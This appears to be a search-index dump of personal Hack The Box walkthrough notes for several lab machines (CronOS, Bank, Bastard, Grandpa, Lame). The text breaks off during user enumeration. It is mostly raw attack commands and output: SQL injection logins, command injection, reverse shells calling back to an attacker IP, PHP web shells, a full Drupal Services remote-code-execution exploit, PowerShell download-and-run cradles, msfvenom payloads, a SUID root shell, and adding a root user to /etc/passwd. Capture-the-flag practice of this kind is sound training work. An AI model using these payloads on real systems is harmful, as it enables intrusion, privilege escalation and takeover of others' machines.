cronos.htb. 604800 IN A 10.10.10.13 admin.cronos.htb. 604800 IN A 10.10.10.13 ns1.cronos.htb. 604800 IN A 10.10.10.13 www.cronos.htb. 604800 IN A 10.10.10.13 cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 ;; Query time: 188 msec ;; SERVER: 10.10.10.13#53(10.10.10.13) ;; WHEN: Mon Apr 22 06:16:18 EDT 2019 ;; XFR size: 7 records (messages 1, bytes 203) http://admin.cronos.htb admin' OR 1=1 # admin' OR 1=1 # http://admin.cronos.htb/welcome.php 8.8.8.8; nc -e /bin/sh 10.10.14.9 2232 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.10.14.9 2232 /tmp/f python -c 'import pty;pty.spawn( /bin/bash );' CTRL+Z stty raw -echo fg $ export SHELL=bash $ export TERM=xterm256-color $ stty rows 38 columns 116 $ cat user.txt 51d236438b333970dbba7dc3089be33b bash LinEnum.sh # m h dom mon dow user command 17 * * * * root cd / run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / run-parts --report /etc/cron.monthly ) * * * * * root php /var/www/laravel/artisan schedule:run /dev/null 2 1 # /var/www/laravel/artisan /* $sock=fsockopen( 10.10.14.9 ,4444);exec( /bin/sh -i 3 3 2 3 ); */ exec( /bin/bash -c 'bash -i /dev/tcp/10.10.14.9/4444 0 1' ); cat root.txt cat root.txt 1703b8a3c9a8dde879942c79d02fd3a0 Or edit /var/www/laravel/app/console/Kernel.php schedule function to exec. // gcc -o /tmp/rootshell /tmp/rootshell.c // chmod u+s /tmp/rootshell // chown root:root /tmp/rootshell; chmod 4755 /tmp/rootshell #include stdio.h #include sys/types.h #include unistd.h int main(void) { setuid(0); setgid(0); system( /bin/bash ); }","title":"CronOS"},{"location":"ctf/hack-the-box/bank/","text":"nmap -sV -sC -oA nmap -T4 10.10.10.29 Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-22 08:44 EDT Nmap scan report for 10.10.10.29 Host is up (0.18s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA) | 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA) | 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA) |_ 256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519) 53/tcp open domain ISC BIND 9.9.5-3ubuntu0.14 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.9.5-3ubuntu0.14-Ubuntu 80/tcp open http Apache httpd 2.4.7 ((Ubuntu)) |_http-server-header: Apache/2.4.7 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 30.86 seconds root@kali:~/HTB/bank# DNS on TCP - Check for zone transfers DirBuster http://bank.htb/server-status/ http://bank.htb/balance-transfer/ wget -r -np http://bank.htb/balance-transfer/ --ERR ENCRYPT FAILED +=================+ | HTB Bank Report | +=================+ ===UserAccount=== Full Name: Christos Christopoulos Email: chris@bank.htb Password: !##HTBB4nkP4ssw0rd!## CreditCards: 5 Transactions: 39 Balance: 8842803 . ===UserAccount=== Check code of the support page. Upload PHP file: filename= shell.htb http://bank.htb/uploads/shell.htb?fexec=nc%20-e%20/bin/sh%2010.10.14.9%204444 # to generate hash of the password openssl passwd mrcake hKLD3431415ZE # to create a second root user with mrcake password echo root2:WVLY0mgH0RtUI:0:0:root:/root:/bin/bash /etc/passwd # to switch to a root2 su root2 Password: mrcake root@bank:~# cat root.txt d5be56adc67b488f81a4b9de30c8a68e Also SUID: /var/htb/bin/emergency","title":"Bank"},{"location":"ctf/hack-the-box/bastard/","text":"Starting Nmap 7.70 ( https://nmap.org ) at 2019-04-21 07:42 EDT Nmap scan report for 10.10.10.9 (10.10.10.9) Host is up (0.16s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 7.5 |_http-generator: Drupal 7 (http://drupal.org) | http-methods: |_ Potentially risky methods: TRACE | http-robots.txt: 36 disallowed entries (15 shown) | /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt |_http-server-header: Microsoft-IIS/7.5 |_http-title: Welcome to 10.10.10.9 | 10.10.10.9 135/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 77.38 seconds Drupal: ./droopescan scan drupal -u http://10.10.10.9 [+] Themes found: seven http://10.10.10.9/themes/seven/ garland http://10.10.10.9/themes/garland/ [+] Possible interesting urls found: Default changelog file - http://10.10.10.9/CHANGELOG.txt Default admin - http://10.10.10.9/user/login [+] Possible version(s): 7.54 [+] Plugins found: ctools http://10.10.10.9/sites/all/modules/ctools/ http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt http://10.10.10.9/sites/all/modules/ctools/changelog.txt http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt http://10.10.10.9/sites/all/modules/ctools/API.txt libraries http://10.10.10.9/sites/all/modules/libraries/ http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt http://10.10.10.9/sites/all/modules/libraries/changelog.txt http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT http://10.10.10.9/sites/all/modules/libraries/README.txt http://10.10.10.9/sites/all/modules/libraries/readme.txt http://10.10.10.9/sites/all/modules/libraries/README.TXT http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt services http://10.10.10.9/sites/all/modules/services/ http://10.10.10.9/sites/all/modules/services/README.txt http://10.10.10.9/sites/all/modules/services/readme.txt http://10.10.10.9/sites/all/modules/services/README.TXT http://10.10.10.9/sites/all/modules/services/LICENSE.txt image http://10.10.10.9/modules/image/ profile http://10.10.10.9/modules/profile/ php http://10.10.10.9/modules/php/ # Exploit Title: Drupal 7.x Services Module Remote Code Execution # Vendor Homepage: https://www.drupal.org/project/services # Exploit Author: Charles FOL # Contact: https://twitter.com/ambionics # Website: https://www.ambionics.io/blog/drupal-services-module-rce #!/usr/bin/php ?php # Drupal Services Module Remote Code Execution Exploit # https://www.ambionics.io/blog/drupal-services-module-rce # cf # # Three stages: # 1. Use the SQL Injection to get the contents of the cache for current endpoint # along with admin credentials and hash # 2. Alter the cache to allow us to write a file and do so # 3. Restore the cache # # Initialization error_reporting(E_ALL); define('QID', 'anything'); define('TYPE_PHP', 'application/vnd.php.serialized'); define('TYPE_JSON', 'application/json'); define('CONTROLLER', 'user'); define('ACTION', 'login'); $url = 'http://10.10.10.9'; $endpoint_path = '/rest'; $endpoint = 'rest_endpoint'; $fileRead = fopen( shell.php , r ) or die( No such file! ); $shell = fread($fileRead,filesize( shell.php )); $phpCode = 'EOD' ?php if (isset($_REQUEST['fupload'])) { file_put_contents($_REQUEST['fupload'], file_get_contents( http://10.10.14.9:8000/ . $_REQUEST['fupload'])); }; if (isset($_REQUEST['fexec'])) { echo pre . shell_exec($_REQUEST['fexec']) . /pre ; }; ? EOD; $file = [ 'filename' = 'dixuSOspsOUU.php', 'data' = $phpCode ]; $browser = new Browser($url . $endpoint_path); # Stage 1: SQL Injection class DatabaseCondition { protected $conditions = [ #conjunction = AND ]; protected $arguments = []; protected $changed = false; protected $queryPlaceholderIdentifier = null; public $stringVersion = null; public function __construct($stringVersion=null) { $this- stringVersion = $stringVersion; if(!isset($stringVersion)) { $this- changed = true; $this- stringVersion = null; } } } class SelectQueryExtender { # Contains a DatabaseCondition object instead of a SelectQueryInterface # so that $query- compile() exists and (string) $query is controlled by us. protected $query = null; protected $uniqueIdentifier = QID; protected $connection; protected $placeholder = 0; public function __construct($sql) { $this- query = new DatabaseCondition($sql); } } $cache_id = services:$endpoint:resources ; $sql_cache = SELECT data FROM {cache} WHERE cid='$cache_id' ; $password_hash = '$S$D2NH.6IZNb1vbZEV1F0S9fqIz3A0Y1xueKznB8vWrMsnV/nrTpnd'; # Take first user but with a custom password # Store the original password hash in signature_format, and endpoint cache # in signature $query = 0x3a) UNION SELECT ux.uid AS uid, . ux.name AS name, '$password_hash' AS pass, . ux.mail AS mail, ux.theme AS theme, ($sql_cache) AS signature, . ux.pass AS signature_format, ux.created AS created, . ux.access AS access, ux.login AS login, ux.status AS status, . ux.timezone AS timezone, ux.language AS language, ux.picture . AS picture, ux.init AS init, ux.data AS data FROM {users} ux . WHERE ux.uid (0 ; $query = new SelectQueryExtender($query); $data = ['username' = $query, 'password' = 'ouvreboite']; $data = serialize($data); $json = $browser- post(TYPE_PHP, $data); # If this worked, the rest will as well if(!isset($json- user)) { print_r($json); e( Failed to login with fake password ); } # Store session and user data $session = [ 'session_name' = $json- session_name, 'session_id' = $json- sessid, 'token' = $json- token ]; store('session', $session); $user = $json- user; # Unserialize the cached value # Note: Drupal websites admins, this is your opportunity to fight back :) $cache = unserialize($user- signature); # Reassign fields $user- pass = $user- signature_format; unset($user- signature); unset($user- signature_format); store('user', $user); if($cache === false) { e( Unable to obtains endpoint's cache value ); } x( Cache contains . sizeof($cache) . entries ); # Stage 2: Change endpoint's behaviour to write a shell class DrupalCacheArray { # Cache ID protected $cid = services:endpoint_name:resources ; # Name of the table to fetch data from. # Can also be used to SQL inject in DrupalDatabaseCache::getMultiple() protected $bin = 'cache'; protected $keysToPersist = []; protected $storage = []; function __construct($storage, $endpoint, $controller, $action) { $settings = [ 'services' = ['resource_api_version' = '1.0'] ]; $this- cid = services:$endpoint:resources ; # If no endpoint is given, just reset the original values if(isset($controller)) { $storage[$controller]['actions'][$action] = [ 'help' = 'Writes data to a file', # Callback function 'callback' = 'file_put_contents', # This one does not accept true as Drupal does, # so we just go for a tautology 'access callback' = 'is_string', 'access arguments' = ['a string'], # Arguments given through POST 'args' = [ 0 = [ 'name' = 'filename', 'type' = 'string', 'description' = 'Path to the file', 'source' = ['data' = 'filename'], 'optional' = false, ], 1 = [ 'name' = 'data', 'type' = 'string', 'description' = 'The data to write', 'source' = ['data' = 'data'], 'optional' = false, ], ], 'file' = [ 'type' = 'inc', 'module' = 'services', 'name' = 'resources/user_resource', ], 'endpoint' = $settings ]; $storage[$controller]['endpoint']['actions'] += [ $action = [ 'enabled' = 1, 'settings' = $settings ] ]; } $this- storage = $storage; $this- keysToPersist = array_fill_keys(array_keys($storage), true); } } class ThemeRegistry Extends DrupalCacheArray { protected $persistable; protected $completeRegistry; } cache_poison($endpoint, $cache); # Write the file $json = (array) $browser- post(TYPE_JSON, json_encode($file)); # Stage 3: Restore endpoint's behaviour cache_reset($endpoint, $cache); if(!(isset($json[0]) $json[0] === strlen($file['data']))) { e( Failed to write file. ); } $file_url = $url . '/' . $file['filename']; x( File written: $file_url ); # HTTP Browser class Browser { private $url; private $controller = CONTROLLER; private $action = ACTION; function __construct($url) { $this- url = $url; } function post($type, $data) { $headers = [ Accept: . TYPE_JSON, Content-Type: $type , Content-Length: . strlen($data) ]; $url = $this- url . '/' . $this- controller . '/' . $this- action; $s = curl_init(); curl_setopt($s, CURLOPT_URL, $url); curl_setopt($s, CURLOPT_HTTPHEADER, $headers); curl_setopt($s, CURLOPT_POST, 1); curl_setopt($s, CURLOPT_POSTFIELDS, $data); curl_setopt($s, CURLOPT_RETURNTRANSFER, true); curl_setopt($s, CURLOPT_SSL_VERIFYHOST, 0); curl_setopt($s, CURLOPT_SSL_VERIFYPEER, 0); $output = curl_exec($s); $error = curl_error($s); curl_close($s); if($error) { e( cURL: $error ); } return json_decode($output); } } # Cache function cache_poison($endpoint, $cache) { $tr = new ThemeRegistry($cache, $endpoint, CONTROLLER, ACTION); cache_edit($tr); } function cache_reset($endpoint, $cache) { $tr = new ThemeRegistry($cache, $endpoint, null, null); cache_edit($tr); } function cache_edit($tr) { global $browser; $data = serialize([$tr]); $json = $browser- post(TYPE_PHP, $data); } # Utils function x($message) { print( $message\\n ); } function e($message) { x($message); exit(1); } function store($name, $data) { $filename = $name.json ; file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT)); x( Stored $name information in $filename ); } http://10.10.10.9/dixuSOspsOUU.php?fexec=type%20C:\\Users\\dimitris\\Desktop\\user.txt ba22fde1932d06eb76a163d312f921a2 http://10.10.10.9/dixuSOspsOUU.php?fexec=systeminfo ./windows-exploit-suggester.py --database 2019-04-21-mssb.xls --systeminfo ~/HTB/bastard/systeminfo [*] initiating winsploit version 3.3... [*] database file detected as xls or xlsx based on extension [*] attempting to read from the systeminfo input file [+] systeminfo input file read successfully (utf-8) [*] querying database file for potential vulnerabilities [*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits [*] there are now 197 remaining vulns [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin [+] windows version identified as 'Windows 2008 R2 64-bit' [*] [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical [*] http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP EMET 5., PoC [*] http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP EMET 5.0 Bypass (MS12-037), PoC [*] [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical [*] done http://10.10.10.9/dixuSOspsOUU.php?fexec=echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/PowerUp.ps1')) | powershell -noprofile - http://10.10.10.9/dixuSOspsOUU.php?fexec=sc query state= all [*] Running Invoke-AllChecks [*] Checking if user is in a local group with administrative privileges... [*] Checking for unquoted service paths... Get-WmiObject : Access denied At line:1451 char:34 + $VulnServices = Get-WmiObject -Class win32_service | Where-Object { $_} | Where-Object {($_.pathname -ne $null) -and ($_.pathname.trim() -ne '')} | Where-Object { (-not $_.pathname.StartsWith( ` )) -and (-not $_.pathname.Star tsWith( ' ))} | Where-Object {($_.pathname.Substring(0, $_.pathname.ToLower().I ndexOf( .exe ) + 4)) -match .* .* } + CategoryInfo : InvalidOperation: (:) [Get-WmiObject], Managemen tException + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C ommands.GetWmiObjectCommand [*] Checking service executable and argument permissions... Get-WmiObject : Access denied At line:1504 char:18 + Get-WMIObject -Class win32_service | Where-Object {$_ -and $_.pathn ame} | ForEach-Object { + CategoryInfo : InvalidOperation: (:) [Get-WmiObject], Managemen tException + FullyQualifiedErrorId : GetWMIManagementException,Microsoft.PowerShell.C ommands.GetWmiObjectCommand [*] Checking service permissions... Get-Service : Cannot open Service Control Manager on computer '.'. This operati on might require other privileges. At line:1555 char:16 + Get-Service | Test-ServiceDaclPermission -PermissionSet 'ChangeConf ig' | ForEach-Object { + CategoryInfo : NotSpecified: (:) [Get-Service], InvalidOperatio nException + FullyQualifiedErrorId : System.InvalidOperationException,Microsoft.Power Shell.Commands.GetServiceCommand [*] Checking %PATH% for potentially hijackable DLL locations... Permissions : AppendData/AddSubdirectory ModifiablePath : C:\\oracle\\ora90\\bin IdentityReference : BUILTIN\\Users %PATH% : C:\\oracle\\ora90\\bin AbuseFunction : Write-HijackDll -DllPath 'C:\\oracle\\ora90\\bin\\wlbsctrl.dll' Permissions : WriteData/AddFile ModifiablePath : C:\\oracle\\ora90\\bin IdentityReference : BUILTIN\\Users %PATH% : C:\\oracle\\ora90\\bin AbuseFunction : Write-HijackDll -DllPath 'C:\\oracle\\ora90\\bin\\wlbsctrl.dll' Permissions : AppendData/AddSubdirectory ModifiablePath : C:\\oracle\\ora90\\Apache\\Perl\\5.00503\\bin\\mswin32-x86 IdentityReference : BUILTIN\\Users %PATH% : C:\\oracle\\ora90\\Apache\\Perl\\5.00503\\bin\\mswin32-x86 AbuseFunction : Write-HijackDll -DllPath 'C:\\oracle\\ora90\\Apache\\Perl\\5.005 03\\bin\\mswin32-x86\\wlbsctrl.dll' Permissions : WriteData/AddFile ModifiablePath : C:\\oracle\\ora90\\Apache\\Perl\\5.00503\\bin\\mswin32-x86 IdentityReference : BUILTIN\\Users %PATH% : C:\\oracle\\ora90\\Apache\\Perl\\5.00503\\bin\\mswin32-x86 AbuseFunction : Write-HijackDll -DllPath 'C:\\oracle\\ora90\\Apache\\Perl\\5.005 03\\bin\\mswin32-x86\\wlbsctrl.dll' [*] Checking for AlwaysInstallElevated registry key... [*] Checking for Autologon credentials in registry... [*] Checking for modifidable registry autoruns and configs... [*] Checking for modifiable schtask files/configs... [*] Checking for unattended install files... [*] Checking for encrypted web.config strings... [*] Checking for encrypted application pool and virtual directory passwords... [*] Checking for plaintext passwords in McAfee SiteList.xml files.... [*] Checking for cached Group Policy Preferences .xml files.... Add-Type : Could not load file or assembly 'System.Core, Version=3.5.0.0, Cultu re=neutral, PublicKeyToken=b77a5c561934e089' or one of its dependencies. The sy stem cannot find the file specified. At line:3565 char:13 + Add-Type -Assembly System.Core + CategoryInfo : NotSpecified: (:) [Add-Type], FileNotFoundExcept ion + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS hell.Commands.AddTypeCommand No oracle running: http://10.10.10.9/dixuSOspsOUU.php?fexec=netstat%20-an Active Connections Proto Local Address Foreign Address State TCP 0.0.0.0:80 0.0.0.0:0 LISTENING TCP 0.0.0.0:81 0.0.0.0:0 LISTENING TCP 0.0.0.0:135 0.0.0.0:0 LISTENING TCP 0.0.0.0:445 0.0.0.0:0 LISTENING TCP 0.0.0.0:3306 0.0.0.0:0 LISTENING TCP 0.0.0.0:47001 0.0.0.0:0 LISTENING TCP 0.0.0.0:49152 0.0.0.0:0 LISTENING TCP 0.0.0.0:49153 0.0.0.0:0 LISTENING TCP 0.0.0.0:49154 0.0.0.0:0 LISTENING TCP 0.0.0.0:49155 0.0.0.0:0 LISTENING TCP 0.0.0.0:49156 0.0.0.0:0 LISTENING TCP 10.10.10.9:80 10.10.14.9:53588 CLOSE_WAIT TCP 10.10.10.9:80 10.10.14.9:53634 ESTABLISHED TCP 10.10.10.9:139 0.0.0.0:0 LISTENING TCP [::]:80 [::]:0 LISTENING TCP [::]:81 [::]:0 LISTENING TCP [::]:135 [::]:0 LISTENING TCP [::]:445 [::]:0 LISTENING TCP [::]:47001 [::]:0 LISTENING TCP [::]:49152 [::]:0 LISTENING TCP [::]:49153 [::]:0 LISTENING TCP [::]:49154 [::]:0 LISTENING TCP [::]:49155 [::]:0 LISTENING TCP [::]:49156 [::]:0 LISTENING UDP 0.0.0.0:123 *:* UDP 0.0.0.0:5355 *:* UDP 10.10.10.9:137 *:* UDP 10.10.10.9:138 *:* UDP [::]:123 *:* 10.10.10.9/dixuSOspsOUU.php?fexec=echo IEX ((New-Object System.Net.WebClient).DownloadString('http://10.10.14.9:8000/Sherlock.ps1')) | powershell -noprofile - Title : User Mode to Ring (KiTrap0D) MSBulletin : MS10-015 CVEID : 2010-0232 Link : https://www.exploit-db.com/exploits/11199/ VulnStatus : Not supported on 64-bit systems Title : Task Scheduler .XML MSBulletin : MS10-092 CVEID : 2010-3338, 2010-3888 Link : https://www.exploit-db.com/exploits/19930/ VulnStatus : Appears Vulnerable Title : NTUserMessageCall Win32k Kernel Pool Overflow MSBulletin : MS13-053 CVEID : 2013-1300 Link : https://www.exploit-db.com/exploits/33213/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenuEx Win32k NULL Page MSBulletin : MS13-081 CVEID : 2013-3881 Link : https://www.exploit-db.com/exploits/31576/ VulnStatus : Not supported on 64-bit systems Title : TrackPopupMenu Win32k Null Pointer Dereference MSBulletin : MS14-058 CVEID : 2014-4113 Link : https://www.exploit-db.com/exploits/35101/ VulnStatus : Not Vulnerable Title : ClientCopyImage Win32k MSBulletin : MS15-051 CVEID : 2015-1701, 2015-2433 Link : https://www.exploit-db.com/exploits/37367/ VulnStatus : Appears Vulnerable Title : Font Driver Buffer Overflow MSBulletin : MS15-078 CVEID : 2015-2426, 2015-2433 Link : https://www.exploit-db.com/exploits/38222/ VulnStatus : Not Vulnerable Title : 'mrxdav.sys' WebDAV MSBulletin : MS16-016 CVEID : 2016-0051 Link : https://www.exploit-db.com/exploits/40085/ VulnStatus : Not supported on 64-bit systems Title : Secondary Logon Handle MSBulletin : MS16-032 CVEID : 2016-0099 Link : https://www.exploit-db.com/exploits/39719/ VulnStatus : Appears Vulnerable Title : Windows Kernel-Mode Drivers EoP MSBulletin : MS16-034 CVEID : 2016-0093/94/95/96 Link : https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS1 6-034? VulnStatus : Not Vulnerable Title : Win32k Elevation of Privilege MSBulletin : MS16-135 CVEID : 2016-7255 Link : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/S ample-Exploits/MS16-135 VulnStatus : Not Vulnerable Title : Nessus Agent 6.6.2 - 6.10.3 MSBulletin : N/A CVEID : 2017-7199 Link : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.h tml VulnStatus : Not Vulnerable https://github.com/hfiref0x/CVE-2015-1701 http://10.10.10.9/dixuSOspsOUU.php?fexec=ms15-051x64.exe \"nc64.exe -e cmd 10.10.14.9 2233\" 4bf12b963da1b30cc93496f617f7ba7c Share files over SMB impacket-smbserver test1 pwd http://10.10.10.9/dixuSOspsOUU.php?fexec=\\10.10.14.9\\test1\\ms15-051x64.exe whoami","title":"Bastard"},{"location":"ctf/hack-the-box/bastard/#share-files-over-smb","text":"impacket-smbserver test1 pwd http://10.10.10.9/dixuSOspsOUU.php?fexec=\\10.10.14.9\\test1\\ms15-051x64.exe whoami","title":"Share files over SMB"},{"location":"ctf/hack-the-box/beep/","text":"","title":"Beep"},{"location":"ctf/hack-the-box/grandpa/","text":"iis_webdav_scstoragepathfromurl https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl https://raw.githubusercontent.com/danigargu/explodingcan/master/explodingcan.py msfvenom -p windows/meterpreter/reverse_tcp -f raw -v sc -e x86/alpha_mixed LHOST=10.10.14.9 LPORT=4444 shellcode python explodingcan.py http://10.10.10.14 shellcode exploit post/multi/recon/local_exploit_suggester [+] 10.10.10.14 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated. [+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable. [+] 10.10.10.14 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. windows/local/ms15_051_client_copy_image ms14_070_tcpip_ioctl","title":"Grandpa"},{"location":"ctf/hack-the-box/lame/","text":"IP: 10.10.10.3 nmap -sC -sV -oA nmap 10.10.10.3 Nmap scan report for 10.10.10.3 (10.10.10.3) Host is up (0.17s latency). Not shown: 996 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 2.3.4 |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | STAT: | FTP server status: | Connected to 10.10.14.9 | Logged in as ftp | TYPE: ASCII | No session bandwidth limit | Session timeout in seconds is 300 | Control connection is plain text | Data connections will be plain text | vsFTPd 2.3.4 - secure, fast, stable |_End of status 22/tcp open ssh OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0) | ssh-hostkey: | 1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA) |_ 2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Host script results: |_clock-skew: mean: -2d22h57m52s, deviation: 0s, median: -2d22h57m52s | smb-os-discovery: | OS: Unix (Samba 3.0.20-Debian) | NetBIOS computer name: | Workgroup: WORKGROUP\\x00 |_ System time: 2019-04-18T01:16:39-04:00 |_smb2-time: Protocol negotiation failed (SMB2) ========================================= Getting domain SID for 10.10.10.3 | ========================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359. Domain Name: WORKGROUP Domain Sid: (NULL SID) [+] Can't determine if host is part of domain or part of a workgroup ==================================== | OS information on 10.10.10.3 | ==================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458. Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464. [+] Got OS info for 10.10.10.3 from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467. [+] Got OS info for 10.10.10.3 from srvinfo: LAME Wk Sv PrQ Unx NT SNT lame server (Samba 3.0.20-Debian) platform_id : 500 os version : 4.9 server type : 0x9a03 =========================== | Users on 10.10.10.3 | =========================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866. index: 0x1 RID: 0x3f2 acb: 0x00000011 Account: games Name: games Desc: (null) index: 0x2 RID: 0x1f5 acb: 0x00000011 Account: nobody Name: nobody Desc: (null) index: 0x3 RID: 0x4ba acb: 0x00000011 Account: bind Name: (null) Desc: (null) index: 0x4 RID: 0x402 acb: 0x00000011 Account: proxy Name: proxy Desc: (null) index: 0x5 RID: 0x4b4 acb: 0x00000011 Account: syslog Name: (null) Desc: (null) index: 0x6 RID: 0xbba acb: 0x00000010 Account: user Name: just a user,111,, Desc: (null) index: 0x7 RID: 0x42a acb: 0x00000011 Account: www-data Name: www-data Desc: (null) index: 0x8 RID: 0x3e8 acb: 0x00000011 Account: root Name: root Desc: (null) index: 0x9 RID: 0x3fa acb: 0x00000011 Account: news Name: news Desc: (null) index: 0xa RID: 0x4c0 acb: 0x00000011 Account: postgres Name: PostgreSQL administrator,,, Desc: (null) index: 0xb RID: 0x3ec acb: 0x00000011 Account: bin Name: bin Desc: (null) index: 0xc RID: 0x3f8 acb: 0x00000011 Account: mail Name: mail Desc: (null) index: 0xd RID: 0x4c6 acb: 0x00000011 Account: distccd Name: (null) Desc: (null) index: 0xe RID: 0x4ca acb: 0x00000011 Account: proftpd Name: (null) Desc: (null) index: 0xf RID: 0x4b2 acb: 0x00000011 Account: dhcp Name: (null) Desc: (null) index: 0x10 RID: 0x3ea acb: 0x00000011 Account: daemon Name: daemon Desc: (null) index: 0x11 RID: 0x4b8 acb: 0x00000011 Account: sshd Name: (null) Desc: (null) index: 0x12 RID: 0x3f4 acb: 0x00000011 Account: man Name: man Desc: (null) index: 0x13 RID: 0x3f6 acb: 0x00000011 Account: lp Name: lp Desc: (null) index: 0x14 RID: 0x4c2 acb: 0x00000011 Account: mysql Name: MySQL Server,,, Desc: (null) index: 0x15 RID: 0x43a acb: 0x00000011 Account: gnats Name: Gnats Bug-Reporting System (admin) Desc: (null) index: 0x16 RID: 0x4b0 acb: 0x00000011 Account: libuuid Name: (null) Desc: (null) index: 0x17 RID: 0x42c acb: 0x00000011 Account: backup Name: backup Desc: (null) index: 0x18 RID: 0xbb8 acb: 0x00000010 Account: msfadmin Name: msfadmin,,, Desc: (null) index: 0x19 RID: 0x4c8 acb: 0x00000011 Account: telnetd Name: (null) Desc: (null) index: 0x1a RID: 0x3ee acb: 0x00000011 Account: sys Name: sys Desc: (null) index: 0x1b RID: 0x4b6 acb: 0x00000011 Account: klog Name: (null) Desc: (null) index: 0x1c RID: 0x4bc acb: 0x00000011 Account: postfix Name: (null) Desc: (null) index: 0x1d RID: 0xbbc acb: 0x00000011 Account: service Name: ,,, Desc: (null) index: 0x1e RID: 0x434 acb: 0x00000011 Account: list Name: Mailing List Manager Desc: (null) index: 0x1f RID: 0x436 acb: 0x00000011 Account: irc Name: ircd Desc: (null) index: 0x20 RID: 